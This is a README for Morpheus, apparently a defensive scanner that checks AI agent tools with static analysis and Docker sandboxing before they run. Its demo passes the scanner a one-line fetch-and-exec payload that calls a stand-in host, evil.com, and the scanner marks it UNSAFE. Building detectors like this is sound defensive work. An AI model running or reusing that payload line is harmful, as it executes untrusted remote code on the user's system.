# Morpheus — AI Agent Security Scanner
### Sandbox + Security Validation Layer

---

## What This Does
Scans AI agent tools for security vulnerabilities before they run in production.
Uses an 8-layer static analysis pipeline combined with isolated Docker sandbox execution.

---

## Setup
```powershell
python -m venv .venv
.venv\Scripts\activate
pip install -r requirements.txt
docker pull python:3.10-slim
python -m pytest tests/ -v
```
Expected output: **37 passed**

---

## Folder Structure
```
Morpheus/
├── sandbox/
│   ├── monitor.py              # Core scanner — runs all 8 layers
│   ├── ast_analyzer.py         # Layer 4: AST structural analysis
│   ├── taint_tracker.py        # Layer 5: Taint flow tracking
│   ├── obfuscation_detector.py # Layer 6 + 7: Obfuscation & dependency scan
│   ├── executor.py             # Pipeline orchestrator
│   ├── docker_manager.py       # Container lifecycle management
│   ├── resource_limiter.py     # CPU / memory / timeout enforcement
│   └── cleanup.py              # Emergency container cleanup
├── validators/
│   ├── input_validator.py      # Validates code format before scanning
│   ├── output_validator.py     # Validates results after scanning
│   ├── signature_checker.py    # Function signature validation
│   └── allowlist.py            # Safe / blocked module list
├── agent/
│   ├── tool_registry.py        # Tool registration + permissions
│   ├── tracer.py               # Execution tracing + audit trail
│   ├── error_recovery.py       # Retry, fallback, graceful degradation
│   ├── async_scanner.py        # Parallel multi-tool scanning
│   └── agent_runner.py         # Main agent interface
└── tests/
    ├── test_sandbox.py
    ├── test_validators.py
    └── test_agent_features.py
```

---

## 8-Layer Security Pipeline

| Layer | What It Scans | File | Speed |
|-------|--------------|------|-------|
| 1 | Core regex — exec, eval, pickle, subprocess, network | `monitor.py` | ~2ms |
| 2 | Extended regex — 80+ dangerous patterns, secrets, reverse shells | `monitor.py` | ~3ms |
| 3 | Bandit — 100+ industry rules, crypto weaknesses, XXE, injection | `monitor.py` | ~200ms |
| 4 | AST analysis — obfuscated calls, string concat, sandbox escapes | `ast_analyzer.py` | ~10ms |
| 5 | Taint tracking — user input → dangerous sink data flows | `taint_tracker.py` | ~10ms |
| 6 | Obfuscation — base64, chr() chains, hex encoding, __reduce__ | `obfuscation_detector.py` | ~5ms |
| 7 | Dependency scan — malicious + typosquat PyPI packages | `obfuscation_detector.py` | ~2ms |
| 8 | Semgrep — 4000+ community rules, OWASP Top 10 (optional) | `monitor.py` | ~2000ms |

**Default scan (Layers 1–7): ~230ms — ~77% attack coverage**
**Full scan (+ Layer 8 Semgrep): ~2300ms — ~85% attack coverage**
**Combined with Docker sandbox: defence-in-depth for remaining attacks**

---

## Verdicts
| Verdict | Meaning |
|---------|---------|
| `SAFE` | No dangerous patterns found — code runs in Docker |
| `SUSPICIOUS` | Medium-severity issues — code runs but flagged |
| `UNSAFE` | High-severity issues — Docker never starts |
| `BLOCKED` | Agent lacks permission to access this tool |
| `UNKNOWN` | Scan failed — graceful degradation triggered |

---

## Quick Demo
```python
from sandbox.executor import execute_safely

result = execute_safely('''
import requests
exec(requests.get("http://evil.com").text)
''')

print(result['verdict'])       # UNSAFE
print(result['summary'])       # UNSAFE - exec(), requests
print(result['layers_used'])   # all active layers
print(result['taint_flows'])   # taint flow detected
```

---

## Agent Features
- **Tool Registry** — register tools with version, owner, and per-agent access control
- **Execution Tracer** — full audit trail of every scan step with timing
- **Error Recovery** — automatic retry with backoff, fallback scanning, graceful degradation
- **Async Scanner** — scan multiple tools simultaneously instead of one by one

```python
from agent.agent_runner import AgentRunner
from sandbox.executor import execute_safely

runner = AgentRunner(execute_safely)
runner.registry.register("doc_gen", code, "Generates docs", allowed_agents=["*"])
result = runner.scan_tool("agent_1", "doc_gen", verbose=True)
print(result['verdict'])
```

---

## Dependencies
```
docker>=7.0.0
pytest>=8.0.0
pytest-mock>=3.12.0
bandit>=1.7.0
```
